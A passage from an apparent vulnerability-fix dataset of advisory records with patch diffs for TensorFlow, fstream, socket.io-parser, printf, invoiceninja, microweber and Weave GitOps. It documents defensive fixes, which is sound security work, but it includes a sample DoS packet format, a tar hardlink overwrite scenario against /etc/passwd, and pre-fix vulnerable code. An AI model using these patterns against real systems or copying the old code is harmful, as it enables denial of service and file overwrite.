{'additions': 34, 'deletions': 33, 'changes': 67, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd\/tensorflow%2Fcore%2Fkernels%2Fsparse%2Fsparse_cholesky_op.cc', 'patch': '@@ -17,6 +17,8 @@ limitations under the License.\\n #include <numeric>\\n #include <vector>\\n \\n+#include \"tensorflow\/core\/framework\/op_requires.h\"\\n+\\n #define EIGEN_USE_THREADS\\n \\n #include \"third_party\/eigen3\/Eigen\/Core\"\\n@@ -82,8 +84,8 @@ class CSRSparseCholeskyCPUOp : public OpKernel {\\n \\n     int64 num_rows;\\n     int batch_size;\\n-    ValidateInputs(ctx, *input_matrix, input_permutation_indices, &batch_size,\\n-                   &num_rows);\\n+    OP_REQUIRES_OK(ctx, ValidateInputs(*input_matrix, input_permutation_indices,\\n+                                       &batch_size, &num_rows));\\n \\n     \/\/ Allocate batch pointers.\\n     Tensor batch_ptr(cpu_allocator(), DT_INT32, TensorShape({batch_size + 1}));\\n@@ -226,49 +228,48 @@ class CSRSparseCholeskyCPUOp : public OpKernel {\\n   }\\n \\n  private:\\n-  void ValidateInputs(OpKernelContext* ctx,\\n-                      const CSRSparseMatrix& sparse_matrix,\\n-                      const Tensor& permutation_indices, int* batch_size,\\n-                      int64* num_rows) {\\n-    OP_REQUIRES(ctx, sparse_matrix.dtype() == DataTypeToEnum<T>::value,\\n-                errors::InvalidArgument(\\n-                    \"Asked for a CSRSparseMatrix of type \",\\n-                    DataTypeString(DataTypeToEnum<T>::value),\\n-                    \" but saw dtype: \", DataTypeString(sparse_matrix.dtype())));\\n+  Status ValidateInputs(const CSRSparseMatrix& sparse_matrix,\\n+                        const Tensor& permutation_indices, int* batch_size,\\n+                        int64* num_rows) {\\n+    if (sparse_matrix.dtype() != DataTypeToEnum<T>::value)\\n+      return errors::InvalidArgument(\\n+          \"Asked for a CSRSparseMatrix of type \",\\n+          DataTypeString(DataTypeToEnum<T>::value),\\n+          \" but saw dtype: \", DataTypeString(sparse_matrix.dtype()));\\n \\n     const Tensor& dense_shape = sparse_matrix.dense_shape();\\n     const int rank = dense_shape.dim_size(0);\\n-    OP_REQUIRES(ctx, rank == 2 || rank == 3,\\n-                errors::InvalidArgument(\"sparse matrix must have rank 2 or 3; \",\\n-                                        \"but dense_shape has size \", rank));\\n+    if (rank < 2 || rank > 3)\\n+      return errors::InvalidArgument(\"sparse matrix must have rank 2 or 3; \",\\n+                                     \"but dense_shape has size \", rank);\\n     const int row_dim = (rank == 2) ? 0 : 1;\\n     auto dense_shape_vec = dense_shape.vec<int64>();\\n     *num_rows = dense_shape_vec(row_dim);\\n     const int64 num_cols = dense_shape_vec(row_dim + 1);\\n-    OP_REQUIRES(ctx, *num_rows == num_cols,\\n-                errors::InvalidArgument(\"sparse matrix must be square; got: \",\\n-                                        *num_rows, \" != \", num_cols));\\n+    if (*num_rows != num_cols)\\n+      return errors::InvalidArgument(\\n+          \"sparse matrix must be square; got: \", *num_rows, \" != \", num_cols);\\n     const TensorShape& perm_shape = permutation_indices.shape();\\n-    OP_REQUIRES(\\n-        ctx, perm_shape.dims() + 1 == rank,\\n-        errors::InvalidArgument(\\n-            \"sparse matrix must have the same rank as permutation; got: \", rank,\\n-            \" != \", perm_shape.dims(), \" + 1.\"));\\n-    OP_REQUIRES(\\n-        ctx, perm_shape.dim_size(rank - 2) == *num_rows,\\n-        errors::InvalidArgument(\\n-            \"permutation must have the same number of elements in each batch \"\\n-            \"as the number of rows in sparse matrix; got: \",\\n-            perm_shape.dim_size(rank - 2), \" != \", *num_rows));\\n+    if (perm_shape.dims() + 1 != rank)\\n+      return errors::InvalidArgument(\\n+          \"sparse matrix must have the same rank as permutation; got: \", rank,\\n+          \" != \", perm_shape.dims(), \" + 1.\");\\n+    if (perm_shape.dim_size(rank - 2) != *num_rows)\\n+      return errors::InvalidArgument(\\n+          \"permutation must have the same number of elements in each batch \"\\n+          \"as the number of rows in sparse matrix; got: \",\\n+          perm_shape.dim_size(rank - 2), \" != \", *num_rows);\\n \\n     *batch_size = sparse_matrix.batch_size();\\n     if (*batch_size > 1) {\\n-      OP_REQUIRES(\\n-          ctx, perm_shape.dim_size(0) == *batch_size,\\n-          errors::InvalidArgument(\"permutation must have the same batch size \"\\n-                                  \"as sparse matrix; got: \",\\n-                                  perm_shape.dim_size(0), \" != \", *batch_size));\\n+      if (perm_shape.dim_size(0) != *batch_size)\\n+        return errors::InvalidArgument(\\n+            \"permutation must have the same batch size \"\\n+            \"as sparse matrix; got: \",\\n+            perm_shape.dim_size(0), \" != \", *batch_size);\\n     }\\n+\\n+    return Status::OK();\\n   }\\n };'}}","message_norm":"remove `op_requires` call from helper function.\n\nsince `op_requires` macro expands to a `return;` (among other), calling it in a helper function only ends the helper function's execution earlier, but the kernel will still run from start to end. thus, all the expected validations are actually broken\/useless as the code ploughs through the next crash anyway.\n\npiperorigin-revid: 369524386\nchange-id: i54f6cf9328445675ccc392e661b04336b229c9da","language":"en","entities":"[('remove', 'ACTION', ''), ('369524386', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse\/sparse_cholesky_op.cc'])","num_files":1.0},{"index":3417,"vuln_id":"GHSA-xf7w-r453-m56c","cwe_id":"{'CWE-59'}","score":7.5,"chain":"{'https:\/\/github.com\/npm\/fstream\/commit\/6a77d2fa6e1462693cf8e46f930da96ec1b0bb22'}","dataset":"osv","summary":"Arbitrary File Overwrite in fstream Versions of `fstream` prior to 1.0.12 are vulnerable to Arbitrary File Overwrite. Extracting tarballs containing a hardlink to a file that already exists in the system and a file that matches the hardlink will overwrite the system's file with the contents of the extracted file. The `fstream.DirWriter()` function is vulnerable.\n\n\n## Recommendation\n\nUpgrade to version 1.0.12 or later.","published_date":"2019-05-30","chain_len":1,"project":"https:\/\/github.com\/npm\/fstream","commit_href":"https:\/\/github.com\/npm\/fstream\/commit\/6a77d2fa6e1462693cf8e46f930da96ec1b0bb22","commit_sha":"6a77d2fa6e1462693cf8e46f930da96ec1b0bb22","patch":"SINGLE","chain_ord":"['6a77d2fa6e1462693cf8e46f930da96ec1b0bb22']","before_first_fix_commit":"{'1e4527ffe8688d4f5325283d7cf2cf2d61f14c6b'}","last_fix_commit":"6a77d2fa6e1462693cf8e46f930da96ec1b0bb22","chain_ord_pos":1.0,"commit_datetime":"05\/15\/2019, 00:37:57","message":"Clobber a Link if it's in the way of a File\n\nFixes https:\/\/github.com\/npm\/node-tar\/issues\/212","author":"isaacs","comments":"{'com_1': {'author': 'ret2libc', 'datetime': '06\/24\/2019, 10:41:00', 'body': \"Does this fix really solve the issue? Doesn't it make it just racy? (e.g. if at the time of check the file is a regular one and it is switched to an hardlink just before the `create()` function is called)\"}, 'com_2': {'author': 'mssalvatore', 'datetime': '08\/29\/2019, 11:35:42', 'body': 'I don\\'t believe this patch is attempting to resolve a TOCTOU condition. The context of the original issue (https:\/\/hackerone.com\/reports\/344595) is that arbitrary files on the filesystem could be overwritten if a crafted **tar archive** were extracted.\\r\\n\\r\\nWithin that context, I don\\'t believe this fix is has a race condition. It is not trying to prevent general TOCTOU issues. Rather, it\\'s preventing the condition where you\\'re in the process of iterating through the entries in a tar archive and you:\\r\\n\\r\\n1) Extract a hardlink named \"LINK\" that points to some arbitrary location (like \/etc\/passwd)\\r\\n2) Extract a regular file that also has the name \"LINK\"\\r\\n\\r\\nWithout this fix, this scenario would result in \/etc\/passwd being overwritten with the contents of the regular file \"LINK\".\\r\\n\\r\\nAll that being said, I am *really* not a javascript\/node.js developer, so:\\r\\n\\r\\n1) Since node.js handles I\/O asynchronously, are there concurrency concerns while looping through and extracting the entries of a tarball? \\r\\n2) Why would someone use fstream at all in this capacity when they could use the tar package instead? I\\'m curious as to why this fix was really necessary in the first place.'}, 'com_3': {'author': 'ret2libc', 'datetime': '09\/10\/2019, 15:20:25', 'body': \"> I don't believe this patch is attempting to resolve a TOCTOU condition. The context of the original issue (https:\/\/hackerone.com\/reports\/344595) is that arbitrary files on the filesystem could be overwritten if a crafted **tar archive** were extracted.\\r\\n\\r\\nTrue, though I was not able to trigger the issue while extracting a tar. Maybe I'm just missing something, but I ended up analyzing the issue in the context of a copy from one directory to another. Also, from reading various comments around this seemed more like a security fix to make npm-audit happy.\"}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/writer.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/npm\/fstream\/raw\/6a77d2fa6e1462693cf8e46f930da96ec1b0bb22\/lib%2Fwriter.js', 'patch': \"@@ -147,7 +147,7 @@ Writer.prototype._stat = function (current) {\\n \\n     \/\/ if it's a type change, then we need to clobber or error.\\n     \/\/ if it's not a type change, then let the impl take care of it.\\n-    if (currentType !== self.type) {\\n+    if (currentType !== self.type || self.type === 'File' && current.nlink > 1) {\\n       return rimraf(self._path, function (er) {\\n         if (er) return self.error(er)\\n         self._old = null\"}}","message_norm":"clobber a link if it's in the way of a file\n\nfixes https:\/\/github.com\/npm\/node-tar\/issues\/212","language":"en","entities":"[('https:\/\/github.com\/npm\/node-tar\/issues\/212', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/writer.js'])","num_files":1.0},{"index":3418,"vuln_id":"GHSA-xfhh-g9f5-x4m4","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/socketio\/socket.io-parser\/commit\/dcb942d24db97162ad16a67c2a0cf30875342d55'}","dataset":"osv","summary":"Resource exhaustion in socket.io-parser The `socket.io-parser` npm package before versions 3.3.2 and 3.4.1 allows attackers to cause a denial of service (memory consumption) via a large packet because a concatenation approach is used.","published_date":"2021-06-30","chain_len":1,"project":"https:\/\/github.com\/socketio\/socket.io-parser","commit_href":"https:\/\/github.com\/socketio\/socket.io-parser\/commit\/dcb942d24db97162ad16a67c2a0cf30875342d55","commit_sha":"dcb942d24db97162ad16a67c2a0cf30875342d55","patch":"SINGLE","chain_ord":"['dcb942d24db97162ad16a67c2a0cf30875342d55']","before_first_fix_commit":"{'a5d04354e6e98b5318d5276123b0b5a5e698bf8e'}","last_fix_commit":"dcb942d24db97162ad16a67c2a0cf30875342d55","chain_ord_pos":1.0,"commit_datetime":"05\/13\/2020, 05:37:32","message":"fix: prevent DoS (OOM) via massive packets (#95)\n\nWhen maxHttpBufferSize is large (1e8 bytes), a payload of length 100MB\r\ncan be sent like so:\r\n\r\n99999991:422222222222222222222222222222222222222222222...\r\n\r\nThis massive packet can cause OOM via building up many many\r\n`ConsOneByteString` objects due to concatenation:\r\n99999989 `ConsOneByteString`s and then converting the massive integer to\r\na `Number`.\r\n\r\nThe performance can be improved to avoid this by using `substring`\r\nrather than building the string via concatenation.\r\n\r\nBelow I tried one payload of length 7e7 as the 1e8 payload took so\r\nlong to process that it timed out before running out of memory.\r\n\r\n```\r\n==== JS stack trace =========================================\r\n\r\n    0: ExitFrame [pc: 0x13c5b79]\r\nSecurity context: 0x152fe7b808d1 <JSObject>\r\n    1: decodeString [0x2dd385fb5d1] [\/node_modules\/socket.io-parser\/index.js:~276] [pc=0xf59746881be](this=0x175d34c42b69 <JSGlobal Object>,0x14eccff10fe1 <Very long string[69999990]>)\r\n    2: add [0x31fc2693da29] [\/node_modules\/socket.io-parser\/index.js:242] [bytecode=0xa7ed6554889 offset=11](this=0x0a2881be5069 <Decoder map = 0x3ceaa8bf48c9>,0x14eccff10fe1 <Very...\r\n\r\nFATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory\r\n 1: 0xa09830 node::Abort() [node]\r\n 2: 0xa09c55 node::OnFatalError(char const*, char const*) [node]\r\n 3: 0xb7d71e v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]\r\n 4: 0xb7da99 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]\r\n 5: 0xd2a1f5  [node]\r\n 6: 0xd2a886 v8::internal::Heap::RecomputeLimits(v8::internal::GarbageCollector) [node]\r\n 7: 0xd37105 v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) [node]\r\n 8: 0xd37fb5 v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]\r\n 9: 0xd3965f v8::internal::Heap::HandleGCRequest() [node]\r\n10: 0xce8395 v8::internal::StackGuard::HandleInterrupts() [node]\r\n11: 0x1042cb6 v8::internal::Runtime_StackGuard(int, unsigned long*, v8::internal::Isolate*) [node]\r\n12: 0x13c5b79  [node]\r\n```","author":"bcaller","comments":"{'com_1': {'author': 'abergmann', 'datetime': '01\/08\/2021, 09:15:14', 'body': '[CVE-2020-36049](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2020-36049) was assigned to this commit.'}}","stats":"{'additions': 7, 'deletions': 10, 'total': 17}","files":"{'index.js': {'additions': 7, 'deletions': 10, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/socketio\/socket.io-parser\/raw\/dcb942d24db97162ad16a67c2a0cf30875342d55\/index.js', 'patch': \"@@ -286,11 +286,9 @@ function decodeString(str) {\\n \\n   \/\/ look up attachments if type binary\\n   if (exports.BINARY_EVENT === p.type || exports.BINARY_ACK === p.type) {\\n-    var buf = '';\\n-    while (str.charAt(++i) !== '-') {\\n-      buf += str.charAt(i);\\n-      if (i == str.length) break;\\n-    }\\n+    var start = i + 1;\\n+    while (str.charAt(++i) !== '-' && i != str.length) {}\\n+    var buf = str.substring(start, i);\\n     if (buf != Number(buf) || str.charAt(i) !== '-') {\\n       throw new Error('Illegal attachments');\\n     }\\n@@ -299,31 +297,30 @@ function decodeString(str) {\\n \\n   \/\/ look up namespace (if any)\\n   if ('\/' === str.charAt(i + 1)) {\\n-    p.nsp = '';\\n+    var start = i + 1;\\n     while (++i) {\\n       var c = str.charAt(i);\\n       if (',' === c) break;\\n-      p.nsp += c;\\n       if (i === str.length) break;\\n     }\\n+    p.nsp = str.substring(start, i);\\n   } else {\\n     p.nsp = '\/';\\n   }\\n \\n   \/\/ look up id\\n   var next = str.charAt(i + 1);\\n   if ('' !== next && Number(next) == next) {\\n-    p.id = '';\\n+    var start = i + 1;\\n     while (++i) {\\n       var c = str.charAt(i);\\n       if (null == c || Number(c) != c) {\\n         --i;\\n         break;\\n       }\\n-      p.id += str.charAt(i);\\n       if (i === str.length) break;\\n     }\\n-    p.id = Number(p.id);\\n+    p.id = Number(str.substring(start, i + 1));\\n   }\\n \\n   \/\/ look up json data\"}}","message_norm":"fix: prevent dos (oom) via massive packets (#95)\n\nwhen maxhttpbuffersize is large (1e8 bytes), a payload of length 100mb\r\ncan be sent like so:\r\n\r\n99999991:422222222222222222222222222222222222222222222...\r\n\r\nthis massive packet can cause oom via building up many many\r\n`consonebytestring` objects due to concatenation:\r\n99999989 `consonebytestring`s and then converting the massive integer to\r\na `number`.\r\n\r\nthe performance can be improved to avoid this by using `substring`\r\nrather than building the string via concatenation.\r\n\r\nbelow i tried one payload of length 7e7 as the 1e8 payload took so\r\nlong to process that it timed out before running out of memory.\r\n\r\n```\r\n==== js stack trace =========================================\r\n\r\n    0: exitframe [pc: 0x13c5b79]\r\nsecurity context: 0x152fe7b808d1 <jsobject>\r\n    1: decodestring [0x2dd385fb5d1] [\/node_modules\/socket.io-parser\/index.js:~276] [pc=0xf59746881be](this=0x175d34c42b69 <jsglobal object>,0x14eccff10fe1 <very long string[69999990]>)\r\n    2: add [0x31fc2693da29] [\/node_modules\/socket.io-parser\/index.js:242] [bytecode=0xa7ed6554889 offset=11](this=0x0a2881be5069 <decoder map = 0x3ceaa8bf48c9>,0x14eccff10fe1 <very...\r\n\r\nfatal error: ineffective mark-compacts near heap limit allocation failed - javascript heap out of memory\r\n 1: 0xa09830 node::abort() [node]\r\n 2: 0xa09c55 node::onfatalerror(char const*, char const*) [node]\r\n 3: 0xb7d71e v8::utils::reportoomfailure(v8::internal::isolate*, char const*, bool) [node]\r\n 4: 0xb7da99 v8::internal::v8::fatalprocessoutofmemory(v8::internal::isolate*, char const*, bool) [node]\r\n 5: 0xd2a1f5  [node]\r\n 6: 0xd2a886 v8::internal::heap::recomputelimits(v8::internal::garbagecollector) [node]\r\n 7: 0xd37105 v8::internal::heap::performgarbagecollection(v8::internal::garbagecollector, v8::gccallbackflags) [node]\r\n 8: 0xd37fb5 v8::internal::heap::collectgarbage(v8::internal::allocationspace, v8::internal::garbagecollectionreason, v8::gccallbackflags) [node]\r\n 9: 0xd3965f v8::internal::heap::handlegcrequest() [node]\r\n10: 0xce8395 v8::internal::stackguard::handleinterrupts() [node]\r\n11: 0x1042cb6 v8::internal::runtime_stackguard(int, unsigned long*, v8::internal::isolate*) [node]\r\n12: 0x13c5b79  [node]\r\n```","language":"en","entities":"[('prevent', 'ACTION', ''), ('dos', 'SECWORD', ''), ('#95', 'ISSUE', ''), ('99999989', 'SHA', 'generic_sha'), ('improved', 'ACTION', ''), ('out of memory', 'SECWORD', ''), ('security', 'SECWORD', ''), ('decodestring', 'SECWORD', ''), ('add', 'ACTION', ''), ('decoder', 'SECWORD', ''), ('error', 'FLAW', ''), ('out of memory', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":3419,"vuln_id":"GHSA-xfhp-gmh8-r8v2","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/adaltas\/node-printf\/commit\/a8502e7c9b0b22555696a2d8ef67722086413a68'}","dataset":"osv","summary":"Regular Expression Denial of Service (ReDoS) The package printf before 0.6.1 are vulnerable to Regular Expression Denial of Service (ReDoS) via the regex string \/\\%(?:\\(([\\w_.]+)\\)|([1-9]\\d*)\\$)?([0 +\\-\\]*)(\\*|\\d+)?(\\.)?(\\*|\\d+)?[hlL]?([\\%bscdeEfFgGioOuxX])\/g in lib\/printf.js. The vulnerable regular expression has cubic worst-case time complexity.","published_date":"2021-03-19","chain_len":1,"project":"https:\/\/github.com\/adaltas\/node-printf","commit_href":"https:\/\/github.com\/adaltas\/node-printf\/commit\/a8502e7c9b0b22555696a2d8ef67722086413a68","commit_sha":"a8502e7c9b0b22555696a2d8ef67722086413a68","patch":"SINGLE","chain_ord":"['a8502e7c9b0b22555696a2d8ef67722086413a68']","before_first_fix_commit":"{'1456b115685791329c6fa6ca4237b7965f10cf82'}","last_fix_commit":"a8502e7c9b0b22555696a2d8ef67722086413a68","chain_ord_pos":1.0,"commit_datetime":"02\/10\/2021, 13:28:56","message":"Fix ReDoS","author":"Yeting Li","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/printf.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/adaltas\/node-printf\/raw\/a8502e7c9b0b22555696a2d8ef67722086413a68\/lib%2Fprintf.js', 'patch': '@@ -41,7 +41,7 @@ var Formatter = function(\/*String*\/ format){\\n   this._tokens = tokenize(format, this._re, this._parseDelim, this);\\n };\\n \\n-Formatter.prototype._re = \/\\\\%(?:\\\\(([\\\\w_.]+)\\\\)|([1-9]\\\\d*)\\\\$)?([0 +\\\\-\\\\#]*)([\\\\*1-9]0*)*(?:(\\\\.)(\\\\*|\\\\d+)?)?[hlL]?([\\\\%bscdeEfFgGioOuxX])\/g;\\n+Formatter.prototype._re = \/\\\\%(?:\\\\(([\\\\w_.]+)\\\\)|([1-9]\\\\d*)\\\\$)?([0 +\\\\-\\\\#]*)(\\\\*|\\\\d+)?(?:(\\\\.)(\\\\*|\\\\d+)?)?[hlL]?([\\\\%bscdeEfFgGioOuxX])\/g;\\n Formatter.prototype._parseDelim = function(mapping, intmapping, flags, minWidth, period, precision, specifier){\\n   if(mapping){\\n     this._mapped = true;'}}","message_norm":"fix redos","language":"pt","entities":"[('fix', 'ACTION', ''), ('redos', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/printf.js'])","num_files":1.0},{"index":3425,"vuln_id":"GHSA-xg6r-5gx4-qxjm","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/invoiceninja\/invoiceninja\/commit\/1186eaa82375692d01d5ef3369c5b7bc7315b55f'}","dataset":"osv","summary":"invoiceninja is vulnerable to Cross-site Scripting invoiceninja is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/invoiceninja\/invoiceninja","commit_href":"https:\/\/github.com\/invoiceninja\/invoiceninja\/commit\/1186eaa82375692d01d5ef3369c5b7bc7315b55f","commit_sha":"1186eaa82375692d01d5ef3369c5b7bc7315b55f","patch":"SINGLE","chain_ord":"['1186eaa82375692d01d5ef3369c5b7bc7315b55f']","before_first_fix_commit":"{'ac194665de6728e4091f273ef2e01b4c48369fcd'}","last_fix_commit":"1186eaa82375692d01d5ef3369c5b7bc7315b55f","chain_ord_pos":1.0,"commit_datetime":"12\/10\/2021, 03:00:22","message":"Fixes for client password reset","author":"David Bomba","comments":null,"stats":"{'additions': 7, 'deletions': 6, 'total': 13}","files":"{'app\/Http\/Controllers\/Auth\/ContactForgotPasswordController.php': {'additions': 7, 'deletions': 6, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/invoiceninja\/invoiceninja\/raw\/1186eaa82375692d01d5ef3369c5b7bc7315b55f\/app%2FHttp%2FControllers%2FAuth%2FContactForgotPasswordController.php', 'patch': \"@@ -93,14 +93,15 @@ public function broker()\\n \\n     public function sendResetLinkEmail(ContactPasswordResetRequest $request)\\n     {\\n-\\n-        if(Ninja::isHosted() && $request->session()->has('company_key'))\\n-            MultiDB::findAndSetDbByCompanyKey($request->session()->get('company_key'));\\n+        if(Ninja::isHosted() && $request->has('company_key'))\\n+            MultiDB::findAndSetDbByCompanyKey($request->input('company_key'));\\n         \\n         $this->validateEmail($request);\\n \\n-        $company = Company::where('company_key', $request->session()->get('company_key'))->first();\\n-        $contact = ClientContact::where(['company_id' => $company->id, 'email' => $request->input('email')])->first();\\n+        \/\/ $company = Company::where('company_key', $request->input('company_key'))->first();\\n+        \/\/ $contact = ClientContact::where(['company_id' => $company->id, 'email' => $request->input('email')])->first();\\n+\\n+        $contact = ClientContact::where(['email' => $request->input('email')])->first();\\n \\n         $response = false;\\n \\n@@ -117,7 +118,7 @@ public function sendResetLinkEmail(ContactPasswordResetRequest $request)\\n             return $this->sendResetLinkFailedResponse($request, Password::INVALID_USER);\\n \\n         \/\/ We will send the password reset link to this user. Once we have attempted\\n-        \/\/ to send the link, we will examine the response then see the message we\\n+        \/\/ to send the link, we will examine thuser@example.ce response then see the message we\\n         \/\/ need to show to the user. Finally, we'll send out a proper response.\\n         \/\/ $response = $this->broker()->sendResetLink(\\n         \/\/     $this->credentials($request)\"}}","message_norm":"fixes for client password reset","language":"en","entities":"[('password', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/Auth\/ContactForgotPasswordController.php'])","num_files":1.0},{"index":3426,"vuln_id":"GHSA-xg72-6c83-ghh4","cwe_id":"{'CWE-79'}","score":4.8,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/d35e691e72d358430abc8e99f5ba9eb374423b9f'}","dataset":"osv","summary":"Microweber Stored Cross-site Scripting before v1.2.20 Microwerber prior to version 1.2.20 is vulnerable to stored Cross-site Scripting (XSS).","published_date":"2022-07-23","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/d35e691e72d358430abc8e99f5ba9eb374423b9f","commit_sha":"d35e691e72d358430abc8e99f5ba9eb374423b9f","patch":"SINGLE","chain_ord":"['d35e691e72d358430abc8e99f5ba9eb374423b9f']","before_first_fix_commit":"{'b39736f1191589e89eb4e54f5f6f05b6349626e3'}","last_fix_commit":"d35e691e72d358430abc8e99f5ba9eb374423b9f","chain_ord_pos":1.0,"commit_datetime":"07\/08\/2022, 13:41:01","message":"update","author":"Peter Ivanov","comments":null,"stats":"{'additions': 12, 'deletions': 4, 'total': 16}","files":"{'src\/MicroweberPackages\/App\/functions\/plupload.php': {'additions': 12, 'deletions': 4, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/d35e691e72d358430abc8e99f5ba9eb374423b9f\/src%2FMicroweberPackages%2FApp%2Ffunctions%2Fplupload.php', 'patch': \"@@ -563,17 +563,25 @@\\n                 }\\n \\n             } else if ($ext === 'svg') {\\n-\\n+                $valid = false;\\n                 if (is_file($filePath)) {\\n                     $sanitizer = new \\\\enshrined\\\\svgSanitize\\\\Sanitizer();\\n                     \/\/ Load the dirty svg\\n                     $dirtySVG = file_get_contents($filePath);\\n                      \/\/ Pass it to the sanitizer and get it back clean\\n-                    $cleanSVG = $sanitizer->sanitize($dirtySVG);\\n-                    file_put_contents($filePath, $cleanSVG);\\n+                    try {\\n+                        $cleanSVG = $sanitizer->sanitize($dirtySVG);\\n+                        $valid = true;\\n+                    } catch (\\\\Exception $e) {\\n+                        $valid = false;\\n+                    }\\n+\\n+                    if ($valid) {\\n+                        file_put_contents($filePath, $cleanSVG);\\n+                    }\\n \\n                 }\\n-               $valid = true;\\n+\\n \\n             } else {\\n                 $valid = false;\"}}","message_norm":"update","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/MicroweberPackages\/App\/functions\/plupload.php'])","num_files":1.0},{"index":3428,"vuln_id":"GHSA-xggc-qprg-x6mw","cwe_id":"{'CWE-532', 'CWE-209', 'CWE-538', 'CWE-200'}","score":9.0,"chain":"{'https:\/\/github.com\/weaveworks\/weave-gitops\/commit\/567356f471353fb5c676c77f5abc2a04631d50ca'}","dataset":"osv","summary":"Weave GitOps leaked cluster credentials into logs on connection errors ### Impact\nA vulnerability in the logging of Weave GitOps could allow an authenticated remote attacker to view sensitive cluster configurations, aka KubeConfg, of registered Kubernetes clusters, including the service account tokens in plain text from Weave GitOps's pod logs on the management cluster. An unauthorized remote attacker can also view these sensitive configurations from external log storage if enabled by the management cluster.\n\nThis vulnerability is due to the client factory dumping cluster configurations and their service account tokens when the cluster manager tries to connect to an API server of a registered cluster, and a connection error occurs. An attacker could exploit this vulnerability by either accessing logs of a pod of Weave GitOps, or from external log storage and obtaining all cluster configurations of registered clusters.\n\nA successful exploit could allow the attacker to use those cluster configurations to manage the registered Kubernetes clusters.\n\n### Patches\nThis vulnerability has been fixed by commit 567356f471353fb5c676c77f5abc2a04631d50ca. Users should upgrade to Weave GitOps core version >= v0.8.1-rc.6 released on 31\/05\/2022.\n\n### Workarounds\nThere is no workaround for this vulnerability.\n\n### References\nDisclosed by Stefan Prodan, Principal Engineer, Weaveworks.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Weave GitOps repository](https:\/\/github.com\/weaveworks\/weave-gitops)\n* Email us at [support@weave.works](mailto:support@weave.works)","published_date":"2022-06-23","chain_len":1,"project":"https:\/\/github.com\/weaveworks\/weave-gitops","commit_href":"https:\/\/github.com\/weaveworks\/weave-gitops\/commit\/567356f471353fb5c676c77f5abc2a04631d50ca","commit_sha":"567356f471353fb5c676c77f5abc2a04631d50ca","patch":"SINGLE","chain_ord":"['567356f471353fb5c676c77f5abc2a04631d50ca']","before_first_fix_commit":"{'a80bb361901d2e0e8f0e675303dfc3cbfcc9ab92'}","last_fix_commit":"567356f471353fb5c676c77f5abc2a04631d50ca","chain_ord_pos":1.0,"commit_datetime":"05\/28\/2022, 12:43:50","message":"Fix logging on cluster connection error\nRemove the client config from the error log since the wrapped error already contains the cluster name for which the connection couldn't be established.\n\nSigned-off-by: Stefan Prodan <stefan.prodan@gmail.com>","author":"Stefan Prodan","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'core\/clustersmngr\/factory.go': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/weaveworks\/weave-gitops\/raw\/567356f471353fb5c676c77f5abc2a04631d50ca\/core%2Fclustersmngr%2Ffactory.go', 'patch': '@@ -131,7 +131,7 @@ func (cf *clientsFactory) watchNamespaces(ctx context.Context) {\\n func (cf *clientsFactory) UpdateNamespaces(ctx context.Context) error {\\n \\tclients, err := clientsForClusters(cf.clusters.Get())\\n \\tif err != nil {\\n-\\t\\tcf.log.Error(err, \"failed to create clients for\", \"clusters\", cf.clusters.Get())\\n+\\t\\tcf.log.Error(err, \"failed to create client\")\\n \\t\\treturn err\\n \\t}'}}","message_norm":"fix logging on cluster connection error\nremove the client config from the error log since the wrapped error already contains the cluster name for which the connection couldn't be established.\n\nsigned-off-by: stefan prodan <stefan.prodan@gmail.com>","language":"en","entities":"[('fix', 'ACTION', ''), ('error', 'FLAW', ''), ('remove', 'ACTION', ''), ('error', 'FLAW', ''), ('error', 'FLAW', ''), ('stefan.prodan@gmail.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/clustersmngr\/factory.go'])","num_files":1.0},{"index":3440,"vuln_id":"GHSA-xhp9-4947-rq78","cwe_id":"{'CWE-755'}","score":9.8,"chain":"{'https:\/\/github.com\/bottlepy\/bottle\/commit\/a2b0ee6bb4ce88895429ec4aca856616244c4c4c', 'https:\/\/github.com\/bottlepy\/bottle\/commit\/e140e1b54da721a660f2eb9d58a106b7b3ff2f00'}","dataset":"osv","summary":"Denial of 